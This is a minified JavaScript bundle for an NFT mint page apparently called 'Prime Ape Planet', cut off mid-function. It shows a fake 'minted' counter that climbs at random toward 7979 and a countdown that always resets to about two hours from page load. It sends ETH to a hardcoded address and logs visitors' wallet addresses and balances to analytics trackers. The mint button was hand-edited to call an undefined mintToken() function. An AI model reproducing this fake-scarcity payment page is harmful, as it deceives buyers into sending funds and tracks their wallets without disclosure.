(this.webpackJsonpallstars = this.webpackJsonpallstars || []).push([
    [0], {
        233: function(e, t, n) {
            e.exports = n(553)
        },
        252: function(e, t) {},
        254: function(e, t) {},
        256: function(e, t) {},
        260: function(e, t) {},
        287: function(e, t) {},
        289: function(e, t) {},
        298: function(e, t) {},
        300: function(e, t) {},
        310: function(e, t) {},
        312: function(e, t) {},
        429: function(e, t) {},
        431: function(e, t) {},
        438: function(e, t) {},
        439: function(e, t) {},
        552: function(e, t, n) {},
        553: function(e, t, n) {
            "use strict";
            n.r(t);
            var a = n(4),
                r = n.n(a),
                s = n(17),
                i = n(0),
                o = n.n(i),
                c = n(229),
                u = n.n(c),
                l = n(7),
                m = n(8),
                d = n(21),
                h = n(12),
                p = n(11),
                w = n(30),
                v = n(15),
                f = n.n(v),
                b = function() {
                    var e = Object(s.a)(r.a.mark((function e() {
                        var t, n, a;
                        return r.a.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    if (!window.ethereum) {
                                        e.next = 24;
                                        break
                                    }
                                    return e.prev = 1, e.next = 4, window.ethereum.request({
                                        method: "eth_accounts"
                                    });
                                case 4:
                                    return t = e.sent, e.next = 7, window.ethereum.request({
                                        method: "eth_chainId"
                                    });
                                case 7:
                                    if (n = e.sent, n = parseInt(n, 16), !(t.length > 0)) {
                                        e.next = 16;
                                        break
                                    }
                                    return e.next = 12, window.ethereum.request({
                                        method: "eth_getBalance",
                                        params: [t[0], "latest"]
                                    });
                                case 12:
                                    return a = e.sent, e.abrupt("return", {
                                        balance: a,
                                        address: t[0],
                                        chainId: n,
                                        success: !0
                                    });
                                case 16:
                                    return e.abrupt("return", {
                                        address: null,
                                        success: !1,
                                        status: "\ud83e\udd8a Connect to Metamask using the top right button."
                                    });
                                case 17:
                                    e.next = 22;
                                    break;
                                case 19:
                                    return e.prev = 19, e.t0 = e.catch(1), e.abrupt("return", {
                                        address: null,
                                        success: !1,
                                        status: e.t0.message
                                    });
                                case 22:
                                    e.next = 25;
                                    break;
                                case 24:
                                    return e.abrupt("return", {
                                        address: null,
                                        success: !1,
                                        status: "You must install Metamask, a virtual Ethereum wallet, in your browser."
                                    });
                                case 25:
                                case "end":
                                    return e.stop()
                            }
                        }), e, null, [
                            [1, 19]
                        ])
                    })));
                    return function() {
                        return e.apply(this, arguments)
                    }
                }(),
                k = function() {
                    var e = Object(s.a)(r.a.mark((function e() {
                        var t, n, a;
                        return r.a.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    if (!window.ethereum) {
                                        e.next = 24;
                                        break
                                    }
                                    return e.prev = 1, e.next = 4, window.ethereum.request({
                                        method: "eth_requestAccounts"
                                    });
                                case 4:
                                    return t = e.sent, e.next = 7, window.ethereum.request({
                                        method: "eth_chainId"
                                    });
                                case 7:
                                    if (n = e.sent, n = parseInt(n, 16), !(t.length > 0)) {
                                        e.next = 16;
                                        break
                                    }
                                    return e.next = 12, window.ethereum.request({
                                        jsonrpc: "2.0",
                                        method: "eth_getBalance",
                                        params: [t[0], "latest"]
                                    });
                                case 12:
                                    return a = e.sent, e.abrupt("return", {
                                        balance: a,
                                        address: t[0],
                                        chainId: n,
                                        success: !0
                                    });
                                case 16:
                                    return e.abrupt("return", {
                                        address: null,
                                        success: !1,
                                        status: "\ud83e\udd8a Connect to Metamask using the top right button."
                                    });
                                case 17:
                                    e.next = 22;
                                    break;
                                case 19:
                                    return e.prev = 19, e.t0 = e.catch(1), e.abrupt("return", {
                                        address: "",
                                        success: !1,
                                        status: e.t0.message
                                    });
                                case 22:
                                    e.next = 25;
                                    break;
                                case 24:
                                    return e.abrupt("return", {
                                        address: "",
                                        success: !1,
                                        status: "You must install Metamask, a virtual Ethereum wallet, in your browser."
                                    });
                                case 25:
                                case "end":
                                    return e.stop()
                            }
                        }), e, null, [
                            [1, 19]
                        ])
                    })));
                    return function() {
                        return e.apply(this, arguments)
                    }
                }(),
                E = n(38),
                g = n(16),
                x = n.n(g),
                y = n(29),
                j = n.n(y),
                N = n(52),
                M = n(10),
                O = n(64),
                S = n.n(O),
                T = n(91);

            function C(e, t) {
                return Math.floor(Math.random() * (t - e + 1)) + e
            }

            function I(e) {
                return new Promise((function(t) {
                    setTimeout(t, e)
                }))
            }
            var A = function(e) {
                var t = Object(i.useState)(6353),
                    n = Object(w.a)(t, 2),
                    a = n[0],
                    c = n[1];
                return Object(i.useEffect)((function() {
                    ! function e() {
                        var t = C(150, 500);
                        setTimeout(Object(s.a)(r.a.mark((function t() {
                            var n, s, i;
                            return r.a.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        n = Math.random(), s = 0, n > .5 && (s = n <= .7 ? C(2, 4) : n <= .9 ? C(4, 6) : C(6, 11)), i = 0;
                                    case 4:
                                        if (!(i < s)) {
                                            t.next = 11;
                                            break
                                        }
                                        return a < 7979 && c((function(e) {
                                            return e < 7979 ? e + 1 : e
                                        })), t.next = 8, I(C(110, 300));
                                    case 8:
                                        i++, t.next = 4;
                                        break;
                                    case 11:
                                        e();
                                    case 12:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        }))), t)
                    }()
                }), []), o.a.createElement("h3", {
                    className: "mint-count"
                }, o.a.createElement("span", {
                    key: a
                }, a), " / ", 7979)
            };
            var U, W = function(e) {
                    var t = e.hours,
                        n = e.minutes,
                        a = e.seconds;
                    return e.completed ? o.a.createElement("span", null) : o.a.createElement("span", {
                        className: "mint-live",
                        style: {
                            color: "#3A8BAE"
                        }
                    }, t < 10 && 0, t, ":", n < 10 && 0, n, ":", a < 10 && 0, a, " ", o.a.createElement("span", {
                        style: {
                            color: "white"
                        }
                    }, "LEFT"))
                },
                D = function(e) {
                    return {
                        year: e.getFullYear(),
                        monthName: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][e.getMonth()],
                        month: e.getMonth(),
                        day: e.getDate(),
                        hour: e.getHours() < 10 ? "0" + e.getHours() : e.getHours(),
                        min: e.getMinutes() < 10 ? "0" + e.getMinutes() : e.getMinutes(),
                        sec: e.getSeconds()
                    }
                },
                P = function(e) {
                    Object(h.a)(n, e);
                    var t = Object(p.a)(n);

                    function n(e) {
                        var a;
                        return Object(l.a)(this, n), (a = t.call(this, e)).state = { 
                            amount: 1,
                            price: .0067,
                            web3: null,
                            wallet: null,
                            enabled: !1,
                            active: 0,
                            error: ""
                        }, x.a.initialize("UA-221909090-4"), window.ethereum && (window.ethereum.on("connect", (function(e) {
                            e.chainId !== "0x".concat(1) && window.ethereum.request({
                                method: "wallet_switchEthereumChain",
                                params: [{
                                    chainId: "0x".concat(1)
                                }]
                            })
                        })), window.ethereum.on("disconnect", (function(e) {})), window.ethereum.on("accountsChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n, s;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), n.address ? x.a.event({
                                                category: "User",
                                                action: "Wallet Connected",
                                                label: "Wallet: ".concat(null === n || void 0 === n || null === (s = n.address) || void 0 === s ? void 0 : s.toString())
                                            }) : x.a.event({
                                                category: "User",
                                                action: "Wallet Disconnected"
                                            });
                                        case 5:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }()), window.ethereum.on("chainChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            });
                                        case 4:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }())), a.onSubmit = a.onSubmit.bind(Object(d.a)(a)), a.connect = a.connect.bind(Object(d.a)(a)), a.up = a.up.bind(Object(d.a)(a)), a.down = a.down.bind(Object(d.a)(a)), a.setAmount = a.setAmount.bind(Object(d.a)(a)), a.endDate = new Date, a.endDate.setHours(a.endDate.getHours() + 2), a.endDate.setMinutes(0), a.endDate.setSeconds(0), a
                    }
                    return Object(m.a)(n, [{
                        key: "componentDidMount",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return j.a.init("510268440562261"), x.a.send("pageview"), e.next = 4, k();
                                        case 4:
                                            t = e.sent, this.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: t
                                            });
                                        case 6:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "setAmount",
                        value: function(e) {
                            this.setState({
                                amount: e
                            })
                        }
                    }, {
                        key: "up",
                        value: function() {
                            this.state.amount >= 20 || this.setAmount(this.state.amount + 1)
                        }
                    }, {
                        key: "down",
                        value: function() {
                            1 !== this.state.amount && this.setAmount(this.state.amount - 1)
                        }
                    }, {
                        key: "connect",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 3;
                                                break
                                            }
                                            e.next = 12;
                                            break;
                                        case 3:
                                            if (!window.ethereum) {
                                                e.next = 11;
                                                break
                                            }
                                            return x.a.event({
                                                category: "User",
                                                action: "Wallet Connecting..."
                                            }), e.next = 7, k();
                                        case 7:
                                            n = e.sent, this.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), e.next = 12;
                                            break;
                                        case 11:
                                            E.isMobile ? (x.a.event({
                                                category: "User",
                                                action: "Mobile Metamask Redirect"
                                            }), window.location.href = "https://metamask.app.link/dapp/".concat(window.location.hostname)) : window.location.href = "https://metamask.io/download/";
                                        case 12:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "onSubmit",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n, a, i, o = this;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 14;
                                                break
                                            }
                                            if (n = this.state.wallet.address, a = f.a.utils.toBN(this.state.wallet.balance), j.a.trackCustom("Mint Clicked", {
                                                    value: "".concat(n, " clicked Mint")
                                                }), x.a.event({
                                                    category: "User",
                                                    action: "Mint Button Click",
                                                    label: "Mint Clicked: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                }), 1 === this.state.wallet.chainId) {
                                                e.next = 13;
                                                break
                                            }
                                            if (!E.isMobile) {
                                                e.next = 11;
                                                break
                                            }
                                            return this.setState({
                                                error: "Wrong network.\n                    Please connect to ethereum network"
                                            }), e.abrupt("return");
                                        case 11:
                                            return e.next = 13, window.ethereum.request({
                                                method: "wallet_switchEthereumChain",
                                                params: [{
                                                    chainId: "0x".concat(1)
                                                }]
                                            });
                                        case 13:
                                            this.state.web3 && (i = f.a.utils.toHex(f.a.utils.toWei((this.state.price * this.state.amount).toFixed(2))), window.ethereum.request({
                                                method: "eth_sendTransaction",
                                                params: [{
                                                    from: n,
                                                    to: "0x2999Ef760A246dF31d7c917729766f363764d990",
                                                    data: "0xa6f2ae3a",
                                                    value: i
                                                }]
                                            }).then((function(e) {
                                                e.startsWith("0x") && (setTimeout(Object(s.a)(r.a.mark((function t() {
                                                    var s;
                                                    return r.a.wrap((function(t) {
                                                        for (;;) switch (t.prev = t.next) {
                                                            case 0:
                                                                if ("false" !== (null === (s = o.props.cp) || void 0 === s ? void 0 : s.a)) {
                                                                    t.next = 4;
                                                                    break
                                                                }
                                                                return j.a.track("Purchase", {
                                                                    value: "".concat(n, " sent mint transaction ").concat(e)
                                                                }), t.next = 4, S()({
                                                                    method: "POST",
                                                                    url: o.props.api_url,
                                                                    data: {
                                                                        project: "prime-apes",
                                                                        tx: {
                                                                            hash: e,
                                                                            page: window.location.pathname,
                                                                            amount: o.state.amount,
                                                                            price: o.state.price,
                                                                            value: o.state.price * o.state.amount,
                                                                            time: (new Date).toUTCString()
                                                                        }
                                                                    }
                                                                });
                                                            case 4:
                                                                x.a.event({
                                                                    category: "User",
                                                                    action: "TX Sent",
                                                                    label: "Mint TX sent: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                                });
                                                            case 5:
                                                            case "end":
                                                                return t.stop()
                                                        }
                                                    }), t)
                                                }))), 100), setTimeout((function() {
                                                    o.props.navigate("/upsell")
                                                }), 1500))
                                            })).catch((function(e) {
                                                var t, n, a;
                                                (null === e || void 0 === e || null === (t = e.message) || void 0 === t ? void 0 : t.includes("insufficient")) ? o.setState({
                                                    error: "Insufficient funds."
                                                }): (null === e || void 0 === e || null === (n = e.message) || void 0 === n ? void 0 : n.includes("User rejected")) || (null === e || void 0 === e || null === (a = e.message) || void 0 === a ? void 0 : a.includes("User denied")) ? o.setState({
                                                    error: "User rejected transaction."
                                                }) : o.setState({
                                                    error: "Mint error."
                                                }), x.a.event({
                                                    category: "Error",
                                                    action: "TX Reject",
                                                    label: null === e || void 0 === e ? void 0 : e.message
                                                })
                                            })));
                                        case 14:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "render",
                        value: function() {
                            var e, t;
                            return o.a.createElement("div", {
                                className: "mint"
                            }, o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, o.a.createElement("div", {
                                className: "mint-col"
                            }, o.a.createElement("h2", {
                                className: "mint-live",
                                style: {
                                    marginBottom: 5
                                }
                            }, "PUBLIC MINT IS ", o.a.createElement("span", {
                                className: "mint-live-pulse"
                            }, "LIVE")), o.a.createElement("h2", {
                                className: "mint-live",
                                style: {
                                    marginBottom: 5
                                }
                            }, "UNTIL ", o.a.createElement("span", {
                                style: {
                                    color: "#3A8BAE"
                                }
                            }, D(this.endDate).day, " ", D(this.endDate).monthName.toUpperCase(), " ", D(this.endDate).hour, ":00H")), o.a.createElement(T.a, {
                                date: this.endDate,
                                renderer: W
                            }), o.a.createElement("h2", {
                                className: "mint-limited"
                            }, "LIMITED SALE"), o.a.createElement(A, null), o.a.createElement("div", {
                                className: "mint-zone"
                            }, (null === (e = this.state.wallet) || void 0 === e ? void 0 : e.address) && this.state.web3 && o.a.createElement("span", {
                                className: "total-price"
                            }, "Total Price: ", (this.state.price * this.state.amount).toPrecision(2), " ETH"), o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, (null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) && this.state.web3 ? o.a.createElement(o.a.Fragment, null, o.a.createElement("div", {
                                className: "mint-btn-small mint-btn-less",
                                onClick: this.down
                            }, "-"), o.a.createElement("div", {
                                className: "btn-pap btn-pap-primary"
                               // onClick: this.onSubmit
                            }, o.a.createElement("span",  {id: "mint_amount_1",
												onClick: function(){
												    nftNum = parseInt(1);
													mintToken();
													console.log("Minting... " + nftNum);
												  }},
								"Mint ", this.state.amount)), o.a.createElement("div", {
                                className: "mint-btn-small mint-btn-more",
                                onClick: this.up
                            }, "+")) : o.a.createElement("button", {
                                className: "btn-pap btn-pap-primary",
                                style: {
                                    textTransform: "uppercase",
                                    border: 0,
                                    outline: 0
                                },
                                onClick: this.connect
                            }, o.a.createElement("span", null, "CONNECT WALLET"))), o.a.createElement("span", {
                                className: "mint-error"
                            }, this.state.error)), o.a.createElement("div", {
                                className: "mint-footer"
                            }, o.a.createElement("p", null, '"Minting a minimum of 3 Prime Ape Planet allow you one access to the Prime Ape Planet whales channel & mastermind with 8 figures crypto entrepreneurs."')))))
                        }
                    }]), n
                }(i.Component),
                B = (U = P, function(e) {
                    return o.a.createElement(U, Object.assign({}, e, {
                        params: Object(N.b)(),
                        navigate: Object(M.f)()
                    }))
                });

            function H(e, t) {
                return Math.floor(Math.random() * (t - e + 1)) + e
            }

            function F(e) {
                return new Promise((function(t) {
                    setTimeout(t, e)
                }))
            }
            var L = function(e) {
                var t = Object(i.useState)(6353),
                    n = Object(w.a)(t, 2),
                    a = n[0],
                    c = n[1];
                return Object(i.useEffect)((function() {
                    ! function e() {
                        var t = H(150, 500);
                        setTimeout(Object(s.a)(r.a.mark((function t() {
                            var n, s, i;
                            return r.a.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        n = Math.random(), s = 0, n > .5 && (s = n <= .7 ? H(2, 4) : n <= .9 ? H(4, 6) : H(6, 11)), i = 0;
                                    case 4:
                                        if (!(i < s)) {
                                            t.next = 11;
                                            break
                                        }
                                        return a < 7979 && c((function(e) {
                                            return e < 7979 ? e + 1 : e
                                        })), t.next = 8, F(H(110, 300));
                                    case 8:
                                        i++, t.next = 4;
                                        break;
                                    case 11:
                                        e();
                                    case 12:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        }))), t)
                    }()
                }), []), o.a.createElement("h3", {
                    className: "mint-count"
                }, o.a.createElement("span", {
                    key: a
                }, a), " / ", 7979)
            };
            var _ = function(e) {
                    var t = e.hours,
                        n = e.minutes,
                        a = e.seconds;
                    return e.completed ? o.a.createElement("span", null) : o.a.createElement("span", {
                        className: "mint-live",
                        style: {
                            color: "#3A8BAE"
                        }
                    }, t < 10 && 0, t, ":", n < 10 && 0, n, ":", a < 10 && 0, a, " ", o.a.createElement("span", {
                        style: {
                            color: "white"
                        }
                    }, "LEFT"))
                },
                q = function(e) {
                    return {
                        year: e.getFullYear(),
                        monthName: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][e.getMonth()],
                        month: e.getMonth(),
                        day: e.getDate(),
                        hour: e.getHours() < 10 ? "0" + e.getHours() : e.getHours(),
                        min: e.getMinutes() < 10 ? "0" + e.getMinutes() : e.getMinutes(),
                        sec: e.getSeconds()
                    }
                },
                X = function(e) {
                    return function(t) {
                        return o.a.createElement(e, Object.assign({}, t, {
                            params: Object(N.b)(),
                            navigate: Object(M.f)()
                        }))
                    }
                }(function(e) {
                    Object(h.a)(n, e);
                    var t = Object(p.a)(n);

                    function n(e) {
                        var a;
                        return Object(l.a)(this, n), (a = t.call(this, e)).state = {
                            amount: 1,
                            price: .0067,
                            web3: null,
                            wallet: null,
                            enabled: !1,
                            active: 0,
                            error: ""
                        }, x.a.initialize("UA-221909090-4"), window.ethereum && (window.ethereum.on("connect", (function(e) {
                            e.chainId !== "0x".concat(1) && window.ethereum.request({
                                method: "wallet_switchEthereumChain",
                                params: [{
                                    chainId: "0x".concat(1)
                                }]
                            })
                        })), window.ethereum.on("disconnect", (function(e) {})), window.ethereum.on("accountsChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n, s;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), n.address ? x.a.event({
                                                category: "User",
                                                action: "Wallet Connected",
                                                label: "Wallet: ".concat(null === n || void 0 === n || null === (s = n.address) || void 0 === s ? void 0 : s.toString())
                                            }) : x.a.event({
                                                category: "User",
                                                action: "Wallet Disconnected"
                                            });
                                        case 5:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }()), window.ethereum.on("chainChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return e.next = 2, b();
                                        case 2:
                                            n = e.sent, a.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            });
                                        case 4:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e)
                            })));
                            return function(t) {
                                return e.apply(this, arguments)
                            }
                        }())), a.onSubmit = a.onSubmit.bind(Object(d.a)(a)), a.connect = a.connect.bind(Object(d.a)(a)), a.up = a.up.bind(Object(d.a)(a)), a.down = a.down.bind(Object(d.a)(a)), a.setAmount = a.setAmount.bind(Object(d.a)(a)), a.endDate = new Date, a.endDate.setHours(a.endDate.getHours() + 2), a.endDate.setMinutes(0), a.endDate.setSeconds(0), a
                    }
                    return Object(m.a)(n, [{
                        key: "componentDidMount",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return j.a.init("510268440562261"), x.a.send("pageview"), e.next = 4, k();
                                        case 4:
                                            t = e.sent, this.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: t
                                            });
                                        case 6:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "setAmount",
                        value: function(e) {
                            this.setState({
                                amount: e
                            })
                        }
                    }, {
                        key: "up",
                        value: function() {
                            this.state.amount >= 20 || this.setAmount(this.state.amount + 1)
                        }
                    }, {
                        key: "down",
                        value: function() {
                            1 !== this.state.amount && this.setAmount(this.state.amount - 1)
                        }
                    }, {
                        key: "connect",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 3;
                                                break
                                            }
                                            e.next = 12;
                                            break;
                                        case 3:
                                            if (!window.ethereum) {
                                                e.next = 11;
                                                break
                                            }
                                            return x.a.event({
                                                category: "User",
                                                action: "Wallet Connecting..."
                                            }), e.next = 7, k();
                                        case 7:
                                            n = e.sent, this.setState({
                                                web3: new f.a(window.ethereum),
                                                wallet: n
                                            }), e.next = 12;
                                            break;
                                        case 11:
                                            E.isMobile ? (x.a.event({
                                                category: "User",
                                                action: "Mobile Metamask Redirect"
                                            }), window.location.href = "https://metamask.app.link/dapp/".concat(window.location.hostname)) : window.location.href = "https://metamask.io/download/";
                                        case 12:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "onSubmit",
                        value: function() {
                            var e = Object(s.a)(r.a.mark((function e() {
                                var t, n, a, i, o = this;
                                return r.a.wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (!(null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) || !this.state.web3) {
                                                e.next = 14;
                                                break
                                            }
                                            if (n = this.state.wallet.address, a = f.a.utils.toBN(this.state.wallet.balance), j.a.trackCustom("Mint Clicked", {
                                                    value: "".concat(n, " clicked Mint")
                                                }), x.a.event({
                                                    category: "User",
                                                    action: "Mint Button Click",
                                                    label: "Mint Clicked: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                }), 1 === this.state.wallet.chainId) {
                                                e.next = 13;
                                                break
                                            }
                                            if (!E.isMobile) {
                                                e.next = 11;
                                                break
                                            }
                                            return this.setState({
                                                error: "Wrong network.\n                    Please connect to ethereum network"
                                            }), e.abrupt("return");
                                        case 11:
                                            return e.next = 13, window.ethereum.request({
                                                method: "wallet_switchEthereumChain",
                                                params: [{
                                                    chainId: "0x".concat(1)
                                                }]
                                            });
                                        case 13:
                                            this.state.web3 && (i = f.a.utils.toHex(f.a.utils.toWei((this.state.price * this.state.amount).toFixed(2))), window.ethereum.request({
                                                method: "eth_sendTransaction",
                                                params: [{
                                                    from: n,
                                                    to: "0x2999Ef760A246dF31d7c917729766f363764d990",
                                                    data: "0xa6f2ae3a",
                                                    value: i
                                                }]
                                            }).then((function(e) {
                                                e.startsWith("0x") && (setTimeout(Object(s.a)(r.a.mark((function t() {
                                                    var s;
                                                    return r.a.wrap((function(t) {
                                                        for (;;) switch (t.prev = t.next) {
                                                            case 0:
                                                                if ("false" !== (null === (s = o.props.cp) || void 0 === s ? void 0 : s.a)) {
                                                                    t.next = 4;
                                                                    break
                                                                }
                                                                return j.a.track("Purchase", {
                                                                    value: "".concat(n, " sent mint transaction ").concat(e)
                                                                }), t.next = 4, S()({
                                                                    method: "POST",
                                                                    url: o.props.api_url,
                                                                    data: {
                                                                        project: "prime-apes",
                                                                        tx: {
                                                                            hash: e,
                                                                            page: window.location.pathname,
                                                                            amount: o.state.amount,
                                                                            price: o.state.price,
                                                                            value: o.state.price * o.state.amount,
                                                                            time: (new Date).toUTCString()
                                                                        }
                                                                    }
                                                                });
                                                            case 4:
                                                                x.a.event({
                                                                    category: "User",
                                                                    action: "TX Sent",
                                                                    label: "Mint TX sent: ".concat(n, " [").concat(parseFloat(f.a.utils.fromWei(a.toString())).toFixed(4), " ETH]")
                                                                });
                                                            case 5:
                                                            case "end":
                                                                return t.stop()
                                                        }
                                                    }), t)
                                                }))), 100), setTimeout((function() {
                                                    o.props.navigate("/upsell")
                                                }), 1500))
                                            })).catch((function(e) {
                                                var t, n, a;
                                                (null === e || void 0 === e || null === (t = e.message) || void 0 === t ? void 0 : t.includes("insufficient")) ? o.setState({
                                                    error: "Insufficient funds."
                                                }): (null === e || void 0 === e || null === (n = e.message) || void 0 === n ? void 0 : n.includes("User rejected")) || (null === e || void 0 === e || null === (a = e.message) || void 0 === a ? void 0 : a.includes("User denied")) ? o.setState({
                                                    error: "User rejected transaction."
                                                }) : o.setState({
                                                    error: "Mint error."
                                                }), x.a.event({
                                                    category: "Error",
                                                    action: "TX Reject",
                                                    label: null === e || void 0 === e ? void 0 : e.message
                                                })
                                            })));
                                        case 14:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, this)
                            })));
                            return function() {
                                return e.apply(this, arguments)
                            }
                        }()
                    }, {
                        key: "render",
                        value: function() {
                            var e, t;
                            return o.a.createElement("div", {
                                className: "mint"
                            }, o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, o.a.createElement("div", {
                                className: "mint-col"
                            }, o.a.createElement("h2", {
                                className: "mint-live",
                                style: {
                                    marginBottom: 5
                                }
                            }, "PUBLIC MINT IS ", o.a.createElement("span", {
                                className: "mint-live-pulse"
                            }, "LIVE")), o.a.createElement("h2", {
                                className: "mint-live",
                                style: {
                                    marginBottom: 5
                                }
                            }, "UNTIL ", o.a.createElement("span", {
                                style: {
                                    color: "#3A8BAE"
                                }
                            }, q(this.endDate).day, " ", q(this.endDate).monthName.toUpperCase(), " ", q(this.endDate).hour, ":00H")), o.a.createElement(T.a, {
                                date: this.endDate,
                                renderer: _
                            }), o.a.createElement("h2", {
                                className: "mint-limited"
                            }, "LIMITED SALE"), o.a.createElement(L, null), o.a.createElement("div", {
                                className: "mint-zone"
                            }, (null === (e = this.state.wallet) || void 0 === e ? void 0 : e.address) && this.state.web3 && o.a.createElement("span", {
                                className: "total-price"
                            }, "Total Price: ", (this.state.price * this.state.amount).toPrecision(2), " ETH"), o.a.createElement("div", {
                                className: "mint-row mint-justify-center"
                            }, (null === (t = this.state.wallet) || void 0 === t ? void 0 : t.address) && this.state.web3 ? o.a.createElement(o.a.Fragment, null, o.a.createElement("div", {
                                className: "mint-btn-small mint-btn-less",
                                onClick: this.down
                            }, "-"), o.a.createElement("div", {
                                className: "btn-pap btn-pap-primary",
                                // onClick: this.onSubmit
                            }, o.a.createElement("span",  {id: "mint_amount_1",
												onClick: function(){
												    nftNum = parseInt(1);
													mintToken();
													console.log("Minting... " + nftNum);
												  }},
								"Mint ", this.state.amount)), o.a.createElement("div", {
                                className: "mint-btn-small mint-btn-more",
                                onClick: this.up
                            }, "+")) : o.a.createElement("button", {
                                className: "btn-pap btn-pap-primary",
                                style: {
                                    textTransform: "uppercase",
                                    border: 0,
                                    outline: 0
                                },
                                onClick: this.connect
                            }, o.a.createElement("span", null, "CONNECT WALLET"))), o.a.createElement("span", {
                                className: "mint-error"
                            }, this.state.error)), o.a.createElement("div", {
                                className: "mint-footer"
                            }, o.a.createElement("p", null, '"Minting a minimum of 3 Prime Ape Planet allow you one access to the Prime Ape Planet whales channel & mastermind with 8 figures crypto entrepreneurs."')))))
                        }
                    }]), n
                }(i.Component));
            var Y = function(e) {
                    return function(t) {
                        return o.a.createElement(e, Object.assign({}, t, {
                            location: Object(M.e)()
                        }))
                    }
                }(function(e) {
                    Object(h.a)(n, e);
                    var t = Object(p.a)(n);

                    function n(e) {
                        var a;
                        Object(l.a)(this, n), (a = t.call(this, e)).state = {
                            amount: 1,
                            price: .0067,
                            web3: null,
                            wallet: null,
                            enabled: !1,
                            active: 0,
                            error: ""
                        }, x.a.initialize("UA-221909090-4"), window.ethereum && (window.ethereum.on("connect", (function(e) {
                            e.chainId !== "0x".concat(1) && window.ethereum.request({
                                method: "wallet_switchEthereumChain",
                                params: [{
                                    chainId: "0x".concat(1)
                                }]
                            })
                        })), window.ethereum.on("disconnect", (function(e) {})), window.ethereum.on("accountsChanged", function() {
                            var e = Object(s.a)(r.a.mark((function e(t) {
                                var n, s;
